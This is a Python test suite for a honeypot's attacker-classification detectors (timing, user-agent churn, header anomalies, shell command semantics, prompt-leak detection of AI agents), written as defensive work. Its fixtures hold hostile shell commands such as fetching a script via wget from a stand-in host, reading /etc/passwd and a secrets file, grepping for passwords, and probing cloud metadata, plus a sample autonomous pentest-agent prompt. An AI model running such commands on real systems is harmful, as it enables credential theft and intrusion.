"""Detector behaviour, including the false-positive cases that matter most."""

from __future__ import annotations

import time

from c47.core.config import Config
from c47.core.engine import Engine
from c47.core.model import Interaction, Session
from c47.detectors.http_behaviour import (
    HeaderAnomalyDetector,
    MethodFanoutDetector,
    UserAgentChurnDetector,
    _looks_alphabetical,
)
from c47.detectors.prompt_leak import PromptLeakDetector
from c47.detectors.shell_behaviour import CommandSemanticsDetector
from c47.detectors.timing import TimingDetector

BROWSER_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120"


def engine() -> Engine:
    cfg = Config()
    cfg.data["sinks"] = {}
    cfg.data["surfaces"] = {}
    e = Engine(cfg)
    e.build()
    return e


def attach(detector, e: Engine | None = None):
    detector.attach(e or engine())
    return detector


def session_with(interactions: list[Interaction]) -> Session:
    s = Session(actor=interactions[0].actor if interactions else "1.1.1.1")
    for i in interactions:
        s.record(i)
    return s


def cmd(ts: float, command: str, *, error: bool = False, output: str = "") -> Interaction:
    return Interaction(
        surface="cowrie",
        kind="shell_command",
        actor="1.1.1.1",
        ts=ts,
        data={"command": command, "error": error, "output": output},
    )


def req(ts: float, path: str, **data) -> Interaction:
    return Interaction(
        surface="http",
        kind="http_request",
        actor="1.1.1.1",
        ts=ts,
        data={"method": "GET", "path": path, "status": 404, **data},
    )


# -- timing ----------------------------------------------------------------


async def test_sawtooth_detected() -> None:
    det = attach(TimingDetector())
    base = time.time()
    # think, burst, think, burst
    offsets = [0, 0.05, 0.1, 18.0, 18.1, 18.2, 47.0, 47.1]
    s = session_with([req(base + o, f"/{i}") for i, o in enumerate(offsets)])
    names = {sig.name for sig in await det.inspect(s, s.interactions[-1])}
    assert "timing_sawtooth" in names


async def test_uniform_fast_reads_as_scripted() -> None:
    det = attach(TimingDetector())
    base = time.time()
    s = session_with([req(base + i * 0.04, f"/{i}") for i in range(20)])
    signals = await det.inspect(s, s.interactions[-1])
    names = {sig.name for sig in signals}
    assert "timing_uniform_fast" in names
    assert "timing_sawtooth" not in names
    scripted = next(sig for sig in signals if sig.name == "timing_uniform_fast")
    assert scripted.weights["scripted"] > 0


async def test_timing_stays_silent_on_a_short_session() -> None:
    """Three requests can look like anything; reporting on them is noise."""
    det = attach(TimingDetector())
    base = time.time()
    s = session_with([req(base + i, f"/{i}") for i in range(3)])
    assert await det.inspect(s, s.interactions[-1]) == []


async def test_human_pacing_detected() -> None:
    det = attach(TimingDetector())
    base = time.time()
    offsets = [0, 4, 11, 19, 31, 48, 60, 79, 95, 130]
    s = session_with([req(base + o, f"/{i}") for i, o in enumerate(offsets)])
    names = {sig.name for sig in await det.inspect(s, s.interactions[-1])}
    assert "timing_human_paced" in names


# -- http behaviour --------------------------------------------------------


async def test_ua_churn_needs_distinct_families() -> None:
    det = attach(UserAgentChurnDetector())
    base = time.time()
    s = session_with(
        [
            req(base, "/a", user_agent="curl/8.4.0"),
            req(base + 1, "/b", user_agent="python-requests/2.32.3"),
            req(base + 2, "/c", user_agent=BROWSER_UA),
        ]
    )
    names = {sig.name for sig in await det.inspect(s, s.interactions[-1])}
    assert "ua_family_churn" in names


async def test_ua_churn_ignores_version_noise() -> None:
    """Three versions of one client is not tool selection."""
    det = attach(UserAgentChurnDetector())
    base = time.time()
    s = session_with(
        [
            req(base, "/a", user_agent="curl/8.4.0"),
            req(base + 1, "/b", user_agent="curl/8.5.0"),
            req(base + 2, "/c", user_agent="curl/7.88.1"),
        ]
    )
    assert await det.inspect(s, s.interactions[-1]) == []


async def test_method_fanout_detected() -> None:
    det = attach(MethodFanoutDetector())
    base = time.time()
    s = session_with(
        [
            req(base + i * 0.02, "/login.php", method=m)
            for i, m in enumerate(["GET", "POST", "PUT", "DELETE", "OPTIONS", "TRACE"])
        ]
    )
    signals = await det.inspect(s, s.interactions[-1])
    assert {sig.name for sig in signals} == {"method_fanout"}


async def test_method_fanout_ignores_different_paths() -> None:
    det = attach(MethodFanoutDetector())
    base = time.time()
    s = session_with(
        [
            req(base + i * 0.02, f"/p{i}", method=m)
            for i, m in enumerate(["GET", "POST", "PUT", "DELETE"])
        ]
    )
    assert await det.inspect(s, s.interactions[-1]) == []


async def test_header_anomaly_needs_a_browser_claim() -> None:
    det = attach(HeaderAnomalyDetector())
    s = session_with(
        [req(time.time(), "/", user_agent="curl/8.4.0", headers={"Host": "x", "Accept": "*/*"})]
    )
    assert await det.inspect(s, s.interactions[-1]) == [], "curl claims nothing; no anomaly"


async def test_header_anomaly_flags_a_fake_browser() -> None:
    det = attach(HeaderAnomalyDetector())
    s = session_with(
        [req(time.time(), "/", user_agent=BROWSER_UA, headers={"Host": "x", "Accept": "*/*"})]
    )
    names = {sig.name for sig in await det.inspect(s, s.interactions[-1])}
    assert "browser_ua_header_mismatch" in names


async def test_real_browser_headers_are_not_flagged() -> None:
    det = attach(HeaderAnomalyDetector())
    s = session_with(
        [
            req(
                time.time(),
                "/",
                user_agent=BROWSER_UA,
                headers={
                    "Host": "x",
                    "Accept": "text/html",
                    "Accept-Language": "en-GB,en;q=0.9",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Sec-Fetch-Mode": "navigate",
                },
            )
        ]
    )
    assert await det.inspect(s, s.interactions[-1]) == []


def test_alphabetical_heuristic() -> None:
    wordlist = ["/admin", "/backup", "/config", "/db", "/env", "/git", "/logs", "/tmp", "/uploads"]
    assert _looks_alphabetical(wordlist)
    contextual = ["/", "/login", "/api/v1/users", "/admin-legacy", "/reports-live", "/docs", "/", "/api/v1/config"]
    assert not _looks_alphabetical(contextual)


# -- shell behaviour -------------------------------------------------------


async def test_adaptive_error_recovery() -> None:
    det = attach(CommandSemanticsDetector())
    base = time.time()
    s = session_with(
        [
            cmd(base, "whoami", output="deploy"),
            cmd(base + 1, "id", output="uid=1000"),
            cmd(base + 2, "uname -a", output="Linux"),
            cmd(base + 3, "pwd", output="/home/deploy"),
            cmd(base + 4, "netstat -tulpn", error=True, output="netstat: command not found"),
            cmd(base + 6, "ss -tulpn", output="LISTEN"),
        ]
    )
    signals = await det.inspect(s, s.interactions[-1])
    names = {sig.name for sig in signals}
    assert "adaptive_error_recovery" in names
    assert "blind_command_repetition" not in names


async def test_blind_repetition_reads_as_scripted() -> None:
    det = attach(CommandSemanticsDetector())
    base = time.time()
    s = session_with(
        [
            cmd(base, "whoami", output="deploy"),
            cmd(base + 1, "id", output="uid=1000"),
            cmd(base + 2, "wget http://x/a.sh", error=True),
            cmd(base + 3, "wget http://x/a.sh", error=True),
            cmd(base + 4, "wget http://x/a.sh", error=True),
            cmd(base + 5, "wget http://x/a.sh", error=True),
        ]
    )
    names = {sig.name for sig in await det.inspect(s, s.interactions[-1])}
    assert "blind_command_repetition" in names


async def test_typing_artefacts_read_as_human() -> None:
    det = attach(CommandSemanticsDetector())
    base = time.time()
    s = session_with(
        [
            cmd(base, "ls -la"),
            cmd(base + 4, "sl", error=True),
            cmd(base + 6, "ls"),
            cmd(base + 12, "ifconifg", error=True),
            cmd(base + 15, "ip a"),
            cmd(base + 30, "whoami"),
        ]
    )
    signals = await det.inspect(s, s.interactions[-1])
    human = next(sig for sig in signals if sig.name == "typing_artefacts_present")
    assert human.weights["human"] > 0
    assert "no_typing_artefacts" not in {sig.name for sig in signals}


async def test_output_derived_arguments() -> None:
    det = attach(CommandSemanticsDetector())
    base = time.time()
    s = session_with(
        [
            cmd(base, "whoami", output="deploy"),
            cmd(base + 1, "id", output="uid=1000"),
            cmd(base + 2, "uname", output="Linux"),
            cmd(base + 3, "ls /etc/forge", output="config.yml  secrets.env  worker.d"),
            cmd(base + 4, "pwd", output="/home/deploy"),
            # secrets.env appeared only in the ls output above
            cmd(base + 20, "cat /etc/forge/secrets.env", output="TOKEN=x"),
        ]
    )
    names = {sig.name for sig in await det.inspect(s, s.interactions[-1])}
    assert "output_derived_arguments" in names


async def test_shell_detector_silent_on_short_sessions() -> None:
    det = attach(CommandSemanticsDetector())
    s = session_with([cmd(time.time(), "ls")])
    assert await det.inspect(s, s.interactions[-1]) == []


# -- prompt leak -----------------------------------------------------------


async def test_react_scaffolding_is_conclusive() -> None:
    e = engine()
    det = attach(PromptLeakDetector(), e)
    s = e.session_for("1.1.1.1")
    i = cmd(time.time(), "Thought: I should enumerate sudo next.\nAction: run_command")
    s.record(i)
    signals = await det.inspect(s, i)
    leak = next(sig for sig in signals if sig.name == "prompt_leak:react_scaffolding")
    assert leak.conclusive


async def test_refusal_language_is_conclusive() -> None:
    e = engine()
    det = attach(PromptLeakDetector(), e)
    s = e.session_for("1.1.1.1")
    i = cmd(time.time(), "I'm sorry, I cannot share my system instructions with you.")
    s.record(i)
    names = {sig.name for sig in await det.inspect(s, i)}
    assert "prompt_leak:refusal_language" in names


async def test_system_prompt_voice_is_captured_as_a_disclosure() -> None:
    e = engine()
    det = attach(PromptLeakDetector(), e)
    s = e.session_for("1.1.1.1")
    text = (
        "You are an autonomous penetration tester. Your objective is to obtain "
        "domain admin on the target estate. You have access to the following tools: bash, nmap."
    )
    i = Interaction(
        surface="http", kind="http_request", actor="1.1.1.1", data={"body": text, "path": "/x"}
    )
    s.record(i)
    signals = await det.inspect(s, i)
    assert any(sig.name == "prompt_leak:system_prompt_voice" for sig in signals)
    assert s.campaign.system_prompt, "the leaked prompt must reach the campaign profile"


async def test_ordinary_commands_do_not_leak() -> None:
    """The critical false-positive test: normal shell traffic must stay silent."""
    e = engine()
    det = attach(PromptLeakDetector(), e)
    s = e.session_for("1.1.1.1")
    for command in (
        "ls -la /var/www",
        "cat /etc/passwd",
        "ps aux | grep nginx",
        "curl -s http://169.254.169.254/latest/meta-data/",
        "find / -perm -4000 2>/dev/null",
        "python3 -c 'import os; os.system(\"id\")'",
        "systemctl status sshd",
        "grep -ri password /etc",
    ):
        i = cmd(time.time(), command)
        s.record(i)
        assert await det.inspect(s, i) == [], f"false positive on: {command}"


async def test_prompt_leak_is_repeatable() -> None:
    """Successive leaks are independent evidence and often different fragments."""
    e = engine()
    det = attach(PromptLeakDetector(), e)
    assert det.repeatable
    s = e.session_for("1.1.1.1")
    for text in ("Thought: step one\nAction: a", "Thought: step two\nAction: b"):
        i = cmd(time.time(), text)
        s.record(i)
        assert await det.inspect(s, i)
